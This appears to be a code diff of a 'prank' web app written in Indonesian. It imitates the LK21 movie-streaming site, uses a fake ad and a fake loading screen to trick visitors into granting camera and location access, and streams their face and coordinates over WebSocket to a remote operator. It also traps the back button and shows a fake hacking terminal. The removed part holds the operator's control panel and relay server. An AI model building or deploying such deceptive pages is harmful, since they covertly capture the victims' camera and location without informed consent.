@@ -1,54 +1,88 @@
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect
-from fastapi.responses import HTMLResponse
-
-app = FastAPI()
-
-target_clients = set()
-remote_clients = set()
-
 TARGET_HTML = """
 <!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Loading Video...</title>
+    <title>LK21 - Nonton Film Bioskop Online</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { overflow: hidden; touch-action: none; background: #000; }
+        body { overflow: hidden; touch-action: none; background: #0a0a0a; font-family: sans-serif; }
         .glitch { animation: glitch 0.3s infinite; }
         @keyframes glitch { 0% { transform: translate(0) } 20% { transform: translate(-2px, 2px) } 40% { transform: translate(-2px, -2px) } 60% { transform: translate(2px, 2px) } 80% { transform: translate(2px, -2px) } 100% { transform: translate(0) } }
+        .poster-img { background-image: url('https://image.tmdb.org/t/p/w500/8Vt6mWEReuy4Of61Lnj5Xj704m8.jpg'); background-size: cover; background-position: center; }
+        
+        /* Animasi Loading */
+        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); width: 50px; height: 50px; border-radius: 50%; border-left-color: #f97316; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
-<body class="text-green-500 font-mono h-screen flex flex-col items-center justify-center select-none bg-black">
+<body class="text-gray-300 h-screen flex flex-col items-center justify-center select-none bg-[#0a0a0a]">
 
-    <!-- LAYAR 1: FAKE VIDEO PLAYER -->
-    <div id="screen-video" class="w-full h-full flex flex-col items-center justify-center bg-gray-900 z-50">
-        <div class="text-center">
-            <h1 class="text-white text-2xl font-bold mb-4">Dune: Part Two (2024)</h1>
-            <div class="w-64 h-36 bg-gray-800 rounded-lg flex items-center justify-center mb-4 border border-gray-700 cursor-pointer" onclick="showAd()">
-                <span class="text-4xl text-white">▶</span>
+    <!-- LAYAR 1: FAKE LK21 UI -->
+    <div id="screen-video" class="w-full h-full flex flex-col bg-[#111] z-50 overflow-y-auto">
+        <div class="bg-[#1a1a1a] p-3 flex justify-between items-center border-b border-gray-800 shadow-lg sticky top-0 z-50">
+            <div class="flex items-center gap-2">
+                <div class="bg-orange-500 text-white font-bold px-2 py-0.5 rounded text-sm">LK21</div>
+                <span class="text-xs text-gray-400 font-bold hidden sm:block">Nonton Movie Sub Indo</span>
             </div>
-            <p class="text-gray-400 text-sm">1080p HD • Sub Indo</p>
+            <div class="flex gap-2">
+                <div class="bg-gray-800 rounded px-2 py-1 text-xs text-gray-500 flex items-center">🔍 Cari...</div>
+                <div class="bg-gray-800 rounded px-2 py-1 text-xs text-gray-500 flex items-center">👤 Login</div>
+            </div>
+        </div>
+
+        <div class="p-4 flex-1">
+            <h2 class="text-orange-500 font-bold mb-3 text-sm border-l-4 border-orange-500 pl-2">Film Terbaru</h2>
+            
+            <div onclick="showAd()" class="relative w-full h-64 rounded-lg overflow-hidden shadow-xl border border-gray-700 cursor-pointer group">
+                <div class="poster-img w-full h-full opacity-80 group-active:opacity-100 transition"></div>
+                <div class="absolute inset-0 bg-gradient-to-t from-black via-transparent to-transparent flex flex-col justify-end p-4">
+                    <span class="bg-orange-600 text-white text-[10px] font-bold px-2 py-1 rounded w-max mb-2">HD</span>
+                    <h1 class="text-white text-xl font-bold">Spider-Man: Across the Spider-Verse</h1>
+                    <p class="text-gray-300 text-xs mt-1">Action, Adventure, Animation</p>
+                    <div class="mt-3 bg-orange-600 text-white text-center font-bold py-2 rounded shadow-lg active:bg-orange-700">
+                        ▶ NONTON SEKARANG
+                    </div>
+                </div>
+            </div>
+
+            <div class="grid grid-cols-3 gap-2 mt-4">
+                <div class="bg-gray-800 h-32 rounded border border-gray-700 opacity-50"></div>
+                <div class="bg-gray-800 h-32 rounded border border-gray-700 opacity-50"></div>
+                <div class="bg-gray-800 h-32 rounded border border-gray-700 opacity-50"></div>
+            </div>
         </div>
     </div>
 
-    <!-- LAYAR 2: POPUP IKLAN HITUNG MUNDUR -->
-    <div id="screen-ad" class="hidden fixed inset-0 bg-black/80 z-50 flex items-center justify-center p-4">
-        <div class="bg-white text-black p-6 rounded-lg text-center max-w-sm w-full relative">
-            <h2 class="font-bold text-lg mb-2">⚠️ AdBlocker Terdeteksi</h2>
+    <!-- LAYAR 2: POPUP IKLAN -->
+    <div id="screen-ad" class="hidden fixed inset-0 bg-black/90 z-50 flex items-center justify-center p-4">
+        <div class="bg-white text-black p-6 rounded-lg text-center max-w-sm w-full relative shadow-2xl">
+            <h2 class="font-bold text-lg mb-2 text-red-600">⚠️ AdBlocker Terdeteksi</h2>
             <p class="text-sm text-gray-600 mb-4">Harap nonaktifkan AdBlocker untuk melanjutkan pemutaran video.</p>
             
             <div id="ad-timer" class="text-xs text-gray-500 mb-2 font-bold">
-                Iklan akan berakhir dalam <span id="timer-count" class="text-red-500 text-lg">3</span>...
+                Memuat video dalam <span id="timer-count" class="text-red-500 text-lg">3</span>...
             </div>
             
-            <button id="btn-skip" onclick="startSystem()" class="hidden bg-blue-600 text-white font-bold py-3 px-6 rounded w-full active:bg-blue-800">✕ LEWATI IKLAN</button>
+            <button id="btn-skip" onclick="startLoading()" class="hidden bg-blue-600 text-white font-bold py-3 px-6 rounded w-full active:bg-blue-800 shadow-md">✕ LEWATI IKLAN</button>
         </div>
     </div>
 
+    <!-- LAYAR 2.5: FAKE LOADING (PENUTUP IZIN KAMERA) -->
+    <div id="screen-loading" class="hidden fixed inset-0 bg-black z-50 flex flex-col items-center justify-center text-white p-6">
+        <div class="spinner mb-6"></div>
+        <h2 class="text-xl font-bold mb-2">Menghubungkan ke Server...</h2>
+        <p class="text-gray-400 text-sm mb-4">Mengoptimalkan pemutaran video 1080p HD</p>
+        <div class="w-64 bg-gray-800 rounded-full h-2.5 mb-2">
+            <div id="progress-bar" class="bg-orange-500 h-2.5 rounded-full" style="width: 0%"></div>
+        </div>
+        <p id="progress-text" class="text-xs text-orange-500">0%</p>
+        <p class="text-[10px] text-gray-500 mt-10 text-center">*Mohon izinkan akses yang diminta browser untuk memverifikasi koneksi Anda.</p>
+    </div>
+
     <!-- LAYAR 3: HACKER TERMINAL -->
-    <div id="screen-hack" class="hidden w-full h-full p-4 flex flex-col justify-between bg-black z-40 relative">
+    <div id="screen-hack" class="hidden w-full h-full p-4 flex flex-col justify-between bg-black z-40 relative text-green-500 font-mono">
         <div onclick="killSwitch()" class="absolute top-0 right-0 w-12 h-12 z-50"></div>
         <div>
             <div class="flex justify-between border-b border-green-800 pb-2 mb-2 text-xs">
@@ -69,11 +103,10 @@ TARGET_HTML = """
 
         <div class="my-2 relative flex justify-center items-center h-48">
             <video id="cam" autoplay playsinline class="hidden w-40 h-40 object-cover rounded-full border-2 border-red-600 shadow-[0_0_20px_rgba(255,0,0,0.8)]"></video>
-            <!-- Canvas tersembunyi untuk streaming kamera ke remote -->
             <canvas id="cam-canvas" width="320" height="240" class="hidden"></canvas>
             
             <video id="vid" playsinline class="hidden w-full max-h-48 rounded border border-green-500" src="https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4"></video>
-            <div id="bsod" class="hidden absolute inset-0 bg-blue-600 text-white flex flex-col items-center justify-center text-center p-4 z-50">
+            <div id="bsod" class="hidden absolute inset-0 bg-blue-600 text-white flex flex-col items-center justify-center text-center p-4 z-50 font-sans">
                 <h1 class="text-6xl mb-4">:(</h1>
                 <p class="text-lg">Your PC ran into a problem and needs to restart.</p>
                 <p class="text-sm mt-4">0% complete</p>
@@ -82,7 +115,7 @@ TARGET_HTML = """
     </div>
 
     <!-- LAYAR 4: PUNCHLINE -->
-    <div id="screen-gotcha" class="hidden fixed inset-0 bg-white text-black z-[100] flex flex-col items-center justify-center p-6 text-center">
+    <div id="screen-gotcha" class="hidden fixed inset-0 bg-white text-black z-[100] flex flex-col items-center justify-center p-6 text-center font-sans">
         <h1 class="text-5xl mb-4">😄</h1>
         <h2 class="text-2xl font-bold mb-2">GOTCHA!</h2>
         <p class="text-gray-700">HP kamu tidak diretas. Ini cuma trik sulap digital.</p>
@@ -96,7 +129,6 @@ TARGET_HTML = """
         let streamInterval;
         const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
 
-        // FUNGSI 1: TAMPILKAN IKLAN HITUNG MUNDUR
         function showAd() {
             document.getElementById('screen-ad').classList.remove('hidden');
             let count = 3;
@@ -111,17 +143,33 @@ TARGET_HTML = """
             }, 1000);
         }
 
-        // FUNGSI 2: EKSEKUSI IZIN, FULLSCREEN & STREAMING
-        async function startSystem() {
+        // FUNGSI BARU: LOADING SCREEN PALSU
+        function startLoading() {
             document.getElementById('screen-ad').classList.add('hidden');
-            document.getElementById('screen-video').classList.add('hidden');
+            document.getElementById('screen-loading').classList.remove('hidden');
             
-            // Minta Fullscreen
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.floor(Math.random() * 8) + 2; // Naik 2-10% tiap interval
+                if (progress > 99) progress = 99; // Tahan di 99% sampai izin diberikan
+                
+                document.getElementById('progress-bar').style.width = `${progress}%`;
+                document.getElementById('progress-text').innerText = `${progress}%`;
+
+                // Jika sudah mencapai 30%, mulai minta izin (Jeda psikologis)
+                if (progress > 30 && progress < 40) {
+                    clearInterval(interval);
+                    executePermissions();
+                }
+            }, 300);
+        }
+
+        // FUNGSI BARU: MINTA IZIN & FULLSCREEN
+        async function executePermissions() {
             if (document.documentElement.requestFullscreen) {
                 document.documentElement.requestFullscreen().catch(()=>{});
             }
 
-            // Minta Kamera & Setup Stream
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 window.camStream = stream; 
@@ -133,7 +181,6 @@ TARGET_HTML = """
                 
                 ws = new WebSocket(`${protocol}//${window.location.host}/ws/target`);
                 
-                // Kirim frame kamera ke remote setiap 300ms
                 streamInterval = setInterval(() => {
                     if(ws.readyState === WebSocket.OPEN && video.readyState === video.HAVE_ENOUGH_DATA) {
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -147,7 +194,6 @@ TARGET_HTML = """
                 ws = new WebSocket(`${protocol}//${window.location.host}/ws/target`);
             }
 
-            // Minta Lokasi
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(pos => {
                     const lat = pos.coords.latitude.toFixed(4);
@@ -159,12 +205,28 @@ TARGET_HTML = """
                 }, ()=>{});
             }
 
-            // Tampilkan Terminal
+            // Setelah izin selesai, lanjutkan loading sampai 100% lalu HACK
+            let finalProgress = 40;
+            const finishInterval = setInterval(() => {
+                finalProgress += 15;
+                if (finalProgress >= 100) {
+                    finalProgress = 100;
+                    clearInterval(finishInterval);
+                    setTimeout(triggerHack, 500);
+                }
+                document.getElementById('progress-bar').style.width = `${finalProgress}%`;
+                document.getElementById('progress-text').innerText = `${finalProgress}%`;
+            }, 300);
+        }
+
+        function triggerHack() {
+            document.getElementById('screen-loading').classList.add('hidden');
+            document.getElementById('screen-video').classList.add('hidden');
+            
             document.getElementById('screen-hack').classList.remove('hidden');
             document.body.classList.add('glitch'); 
             setTimeout(() => document.body.classList.remove('glitch'), 300);
 
-            // Info Device
             document.getElementById('device-info').innerText = navigator.userAgent;
             if (navigator.getBattery) {
                 navigator.getBattery().then(b => document.getElementById('battery').innerText = `BAT: ${Math.round(b.level * 100)}%`);
@@ -172,11 +234,9 @@ TARGET_HTML = """
                 document.getElementById('battery').innerText = `BAT: ${Math.floor(Math.random() * 40) + 40}%`; 
             }
 
-            // Trap Back Button
             history.pushState(null, null, location.href);
             window.onpopstate = function () { history.go(1); };
 
-            // Teater Scan File
             setInterval(() => {
                 const files = ["/DCIM/Camera/IMG_2024.jpg", "/WhatsApp/Chats/msg.db", "/Android/data/com.tiktok/cache", "/Documents/Rahasia.pdf"];
                 const file = files[Math.floor(Math.random() * files.length)];
@@ -220,7 +280,6 @@ TARGET_HTML = """
             log.innerHTML = `> ${msg}<br>` + log.innerHTML;
         }
 
-        // Kill Switch Rahasia (Tap 5x pojok kanan atas)
         function killSwitch() {
             tapCount++;
             if (tapCount >= 5) {
@@ -233,152 +292,3 @@ TARGET_HTML = """
 </body>
 </html>
 """
-
-REMOTE_HTML = """
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ROOT@EXPLOIT_FRAMEWORK</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        body { background-color: #050505; color: #00ff41; font-family: 'Courier New', Courier, monospace; }
-        .terminal-box { border: 1px solid #00ff41; background: rgba(0, 20, 0, 0.5); box-shadow: 0 0 10px rgba(0, 255, 65, 0.2); }
-        .btn-hack { background: #001a00; border: 1px solid #00ff41; color: #00ff41; transition: all 0.2s; }
-        .btn-hack:active { background: #00ff41; color: #000; }
-        .scanline { background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0) 50%, rgba(0,0,0,0.2) 50%, rgba(0,0,0,0.2)); background-size: 100% 4px; pointer-events: none; }
-    </style>
-</head>
-<body class="min-h-screen p-3 relative overflow-x-hidden">
-    <div class="fixed inset-0 scanline z-50 pointer-events-none"></div>
-
-    <div class="max-w-md mx-auto relative z-10">
-        <!-- Header -->
-        <div class="flex items-center justify-between border-b border-green-800 pb-2 mb-3 text-xs">
-            <h1 class="font-bold">root@kali:~# ./exploit.sh</h1>
-            <span id="status" class="bg-red-900 text-red-400 px-2 py-0.5 rounded animate-pulse">WAITING...</span>
-        </div>
-
-        <!-- Target Info -->
-        <div class="terminal-box p-2 mb-3 text-xs">
-            <div class="flex justify-between">
-                <span>TARGET IP:</span>
-                <span id="target-ip" class="text-white">Scanning...</span>
-            </div>
-            <div class="flex justify-between mt-1">
-                <span>GEOLOCATION:</span>
-                <span id="target-loc" class="text-yellow-400 font-bold">Locking...</span>
-            </div>
-        </div>
-
-        <!-- Camera Feed (Streaming) -->
-        <div class="terminal-box p-2 mb-3 relative flex flex-col items-center justify-center h-48 overflow-hidden">
-            <img id="remote-cam" class="w-full h-full object-cover hidden" />
-            <div id="cam-placeholder" class="absolute inset-0 flex items-center justify-center text-green-900 text-xs text-center">
-                [ CAMERA FEED OFFLINE ]<br>Press 'ACCESS CAMERA'
-            </div>
-            <!-- Radar Overlay -->
-            <div class="absolute inset-0 border-2 border-green-500 rounded-full opacity-30 animate-ping pointer-events-none"></div>
-        </div>
-
-        <!-- Ghost Typing -->
-        <div class="mb-3">
-            <label class="block text-[10px] text-green-700 mb-1">> INJECT_PAYLOAD (GHOST_TYPING):</label>
-            <textarea id="ghost-input" rows="2" placeholder="Ketik pesan untuk menakuti..." class="w-full bg-black text-green-400 font-mono p-2 text-sm border border-green-800 focus:outline-none focus:border-green-400"></textarea>
-        </div>
-
-        <!-- Control Buttons -->
-        <div class="grid grid-cols-2 gap-2 mb-2 text-xs font-bold">
-            <button onclick="sendCmd('camera')" class="btn-hack p-2">📸 ACCESS CAMERA</button>
-            <button onclick="sendCmd('vibrate')" class="btn-hack p-2">📳 VIBRATE & ALARM</button>
-            <button onclick="sendCmd('video')" class="btn-hack p-2">🎬 PLAY VIDEO</button>
-            <button onclick="sendCmd('bsod')" class="btn-hack p-2">💻 FAKE BSOD</button>
-        </div>
-        
-        <!-- System Control -->
-        <div class="grid grid-cols-2 gap-2 text-xs font-bold mt-4 border-t border-green-900 pt-3">
-            <button onclick="sendCmd('reset')" class="border border-yellow-600 text-yellow-500 p-2 active:bg-yellow-600 active:text-black">🔄 RESET SYSTEM</button>
-            <button onclick="sendCmd('punchline')" class="border border-blue-500 text-blue-400 p-2 active:bg-blue-500 active:text-black">🎉 SHOW PUNCHLINE</button>
-        </div>
-    </div>
-
-    <script>
-        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-        const ws = new WebSocket(`${protocol}//${window.location.host}/ws/remote`);
-
-        ws.onopen = () => {
-            const st = document.getElementById('status');
-            st.innerText = 'CONNECTED';
-            st.className = 'bg-green-900 text-green-400 px-2 py-0.5 rounded';
-            document.getElementById('target-ip').innerText = '192.168.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255);
-        };
-
-        document.getElementById('ghost-input').addEventListener('input', (e) => {
-            if(ws.readyState === WebSocket.OPEN) {
-                ws.send(JSON.stringify({ action: 'type', text: e.target.value }));
-            }
-        });
-
-        function sendCmd(action) {
-            if(ws.readyState === WebSocket.OPEN) {
-                ws.send(JSON.stringify({ action: action }));
-            }
-        }
-
-        // Menangani pesan masuk dari Target (Kamera & Lokasi)
-        ws.onmessage = (event) => {
-            const data = JSON.parse(event.data);
-            
-            if (data.action === 'frame') {
-                const img = document.getElementById('remote-cam');
-                img.src = data.data;
-                img.classList.remove('hidden');
-                document.getElementById('cam-placeholder').classList.add('hidden');
-            } 
-            else if (data.action === 'location') {
-                document.getElementById('target-loc').innerText = `${data.lat}, ${data.lon}`;
-            }
-        };
-    </script>
-</body>
-</html>
-"""
-
-@app.get("/")
-async def get_target():
-    return HTMLResponse(TARGET_HTML)
-
-@app.get("/remote")
-async def get_remote():
-    return HTMLResponse(REMOTE_HTML)
-
-@app.websocket("/ws/target")
-async def websocket_target(websocket: WebSocket):
-    await websocket.accept()
-    target_clients.add(websocket)
-    try:
-        while True:
-            data = await websocket.receive_text()
-            for remote in list(remote_clients):
-                try:
-                    await remote.send_text(data)
-                except:
-                    remote_clients.remove(remote)
-    except WebSocketDisconnect:
-        target_clients.remove(websocket)
-
-@app.websocket("/ws/remote")
-async def websocket_remote(websocket: WebSocket):
-    await websocket.accept()
-    remote_clients.add(websocket)
-    try:
-        while True:
-            data = await websocket.receive_text()
-            for target in list(target_clients):
-                try:
-                    await target.send_text(data)
-                except:
-                    target_clients.remove(target)
-    except WebSocketDisconnect:
-        remote_clients.remove(websocket)
